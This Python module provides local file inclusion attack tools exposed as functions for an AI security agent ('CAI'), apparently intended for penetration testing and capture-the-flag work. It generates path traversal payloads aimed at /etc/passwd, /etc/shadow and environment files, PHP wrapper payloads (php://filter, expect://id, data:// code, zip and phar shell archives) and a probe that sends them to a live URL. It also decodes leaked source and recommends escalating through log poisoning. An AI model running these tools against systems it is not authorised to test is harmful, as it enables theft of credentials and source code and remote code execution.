"""
LFI (Local File Inclusion) helper tools for CAI.

Generates payload variants for the most common LFI patterns (path
traversal, PHP wrappers, log poisoning targets) and ships a fast
authenticated probe that injects payloads against a parameter and
detects success via canonical markers (root:x:, [boot loader], etc.).
"""
from __future__ import annotations

import base64
from typing import List, Optional
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import requests  # pylint: disable=E0401

from cai.sdk.agents import function_tool


# ── Payload catalogue ───────────────────────────────────────────────

LINUX_TARGETS: List[str] = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/shadow",
    "/etc/issue",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
]

WINDOWS_TARGETS: List[str] = [
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
]

# Markers in responses that confirm the file was read
SUCCESS_MARKERS: List[str] = [
    "root:x:",        # /etc/passwd Linux
    "root:!:",        # /etc/passwd alt
    "[boot loader]",  # boot.ini Windows
    "; for 16-bit",   # win.ini Windows
    "127.0.0.1",      # /etc/hosts
    "PATH=",          # /proc/self/environ
]


def _generate_lfi_payloads_impl(
    target_files: Optional[List[str]] = None,
    max_depth: int = 8,
    include_wrappers: bool = True,
) -> str:
    """Build a list of LFI payload variants suitable for fuzzing."""
    targets = target_files or (LINUX_TARGETS + WINDOWS_TARGETS)
    payloads: List[str] = []

    for tgt in targets:
        # Direct absolute access (no traversal)
        payloads.append(tgt)
        # Traversals at increasing depths
        for depth in range(1, max_depth + 1):
            traversal = "../" * depth
            payloads.append(traversal + tgt.lstrip("/"))
            # Null-byte truncation (PHP < 5.3.4)
            payloads.append(traversal + tgt.lstrip("/") + "%00")
            # URL-encoded slashes (firewall bypass)
            payloads.append(traversal.replace("/", "%2f") + tgt.lstrip("/"))
            # Double URL-encoded
            payloads.append(("%252e%252e%252f" * depth) + tgt.lstrip("/"))

    if include_wrappers:
        for tgt in targets:
            if tgt.startswith("/"):
                # PHP wrappers — bypass display filters and read source
                payloads.append(f"php://filter/convert.base64-encode/resource={tgt}")
                payloads.append(f"php://filter/read=string.toupper/resource={tgt}")
            payloads.append("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==")
            payloads.append("expect://id")
            # Archive wrappers for upload+LFI chains. The target must be the
            # absolute on-disk path of an uploaded archive; common landing
            # dirs are /var/www/html/uploads/, /tmp/, /var/tmp/. The `#`
            # is URL-encoded as %23 by callers when injecting into a query
            # string. The inner filename excludes the .php suffix when the
            # vulnerable include concatenates ".php" automatically.
            for upload_dir in ("/var/www/html/uploads", "/tmp"):
                payloads.append(f"zip://{upload_dir}/shell.zip%23shell")
                payloads.append(f"phar://{upload_dir}/shell.phar/shell")
            break  # only emit wrapper variants once

    # Dedup preserving order
    seen = set()
    deduped = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            deduped.append(p)
    return "\n".join(deduped)


def _inject_into_url(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    found = False
    new_pairs = []
    for k, v in pairs:
        if k == param:
            new_pairs.append((k, value))
            found = True
        else:
            new_pairs.append((k, v))
    if not found:
        new_pairs.append((param, value))
    return urlunparse(parsed._replace(query=urlencode(new_pairs)))


def _detect_success(body: str) -> Optional[str]:
    for marker in SUCCESS_MARKERS:
        if marker in body:
            return marker
    return None


def _lfi_probe_impl(  # pylint: disable=too-many-arguments,too-many-locals
    url: str,
    param: str,
    targets: Optional[List[str]] = None,
    max_depth: int = 8,
    cookies: Optional[str] = None,
    timeout: int = 10,
) -> str:
    """Probe a parameter for LFI. Returns the first hit found (with the
    payload that worked and the matching marker), or a 'no hit' summary.
    """
    payloads_str = _generate_lfi_payloads_impl(
        target_files=targets, max_depth=max_depth, include_wrappers=False,
    )
    payloads = [p for p in payloads_str.splitlines() if p.strip()]

    headers = {}
    if cookies:
        headers["Cookie"] = cookies

    lines = [f"=== LFI probe: {url} param={param} ({len(payloads)} payloads) ==="]
    hits: List[str] = []

    for payload in payloads:
        target = _inject_into_url(url, param, payload)
        try:
            resp = requests.get(
                target, headers=headers, timeout=timeout, verify=False,
                allow_redirects=True,
            )
        except requests.RequestException as exc:
            lines.append(f"  [ERR] {payload!r}: {exc}")
            continue

        marker = _detect_success(resp.text)
        if marker:
            hits.append(f"  [HIT] payload={payload!r} marker={marker!r}")
            lines.append(hits[-1])
            # Show 200 chars of body context around the marker
            idx = resp.text.find(marker)
            snippet = resp.text[max(0, idx - 40): idx + 200].replace("\n", " ")
            lines.append(f"        body[~marker]: {snippet}")
            # Report first hit and stop — agent can drill down from here
            break
        # else silent miss

    if not hits:
        lines.append(f"\nNo marker found in {len(payloads)} payloads — parameter {param!r} "
                     f"appears not LFI-vulnerable, or markers are filtered.")
    else:
        lines.append(f"\n=== {len(hits)} LFI hit(s) ===")
        lines.append(
            "Next steps: replay the working payload manually with curl to "
            "inspect full body, then escalate via php://filter (read source) "
            "or log poisoning if you control any logged input (User-Agent, etc.)."
        )
    return "\n".join(lines)


def _php_filter_payload_impl(file_path: str, encoding: str = "base64") -> str:
    """Build a php://filter URI to read ``file_path`` through a converter.

    Common encodings: base64, rot13, string.toupper.
    """
    if encoding == "base64":
        return f"php://filter/convert.base64-encode/resource={file_path}"
    return f"php://filter/read={encoding}/resource={file_path}"


def _decode_php_filter_response_impl(body: str) -> str:
    """Try base64-decoding the body of a php://filter response. Returns
    the decoded source or an explanation if it doesn't look like b64.
    """
    body = body.strip()
    try:
        return base64.b64decode(body).decode("utf-8", errors="replace")
    except Exception as exc:
        return f"Error: body does not look like base64 ({exc}). Length={len(body)}."


# ── @function_tool surface ──────────────────────────────────────────

@function_tool(strict_mode=False)
def generate_lfi_payloads(
    target_files: Optional[List[str]] = None,
    max_depth: int = 8,
    include_wrappers: bool = True,
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Generate a newline-separated list of LFI payload variants.

    Args:
        target_files: Optional list of target paths. Defaults to common
            Linux + Windows files (passwd, hosts, win.ini, etc.).
        max_depth: Max number of ``../`` segments per payload.
        include_wrappers: Include PHP wrappers (php://filter, data://, expect://).

    Returns:
        Newline-separated payload list.
    """
    return _generate_lfi_payloads_impl(
        target_files=target_files, max_depth=max_depth,
        include_wrappers=include_wrappers,
    )


@function_tool(strict_mode=False)
def lfi_probe(  # pylint: disable=too-many-arguments
    url: str,
    param: str,
    targets: Optional[List[str]] = None,
    max_depth: int = 8,
    cookies: str = "",
    timeout: int = 10,
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Inject LFI payloads into a parameter and report the first hit.

    Args:
        url: Target URL with optional query string.
        param: Parameter name to inject into. Required.
        targets: Optional list of files to try (default: common Linux/Windows).
        max_depth: Max traversal depth per target.
        cookies: Optional cookie header value (e.g. "PHPSESSID=abc").
        timeout: Per-request timeout in seconds.

    Returns:
        Human-readable probe report with the hit (if any).
    """
    return _lfi_probe_impl(
        url=url, param=param, targets=targets, max_depth=max_depth,
        cookies=cookies or None, timeout=timeout,
    )


@function_tool(strict_mode=False)
def php_filter_payload(
    file_path: str,
    encoding: str = "base64",
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Build a php://filter URI to read a file through a stream converter.

    Args:
        file_path: Absolute path on the server (e.g. /etc/passwd or
            /var/www/html/index.php).
        encoding: Stream filter — ``base64`` (default), ``rot13``,
            ``string.toupper``, etc.

    Returns:
        The php://filter URI string ready to inject as parameter value.
    """
    return _php_filter_payload_impl(file_path, encoding)


@function_tool(strict_mode=False)
def decode_php_filter_response(body: str, ctf=None) -> str:  # pylint: disable=unused-argument
    """Decode the base64 body returned by a php://filter/convert.base64-encode
    request, revealing the source of the targeted file.

    Args:
        body: Raw response body from the LFI request.

    Returns:
        Decoded source code (or an error message if the body is not base64).
    """
    return _decode_php_filter_response_impl(body)
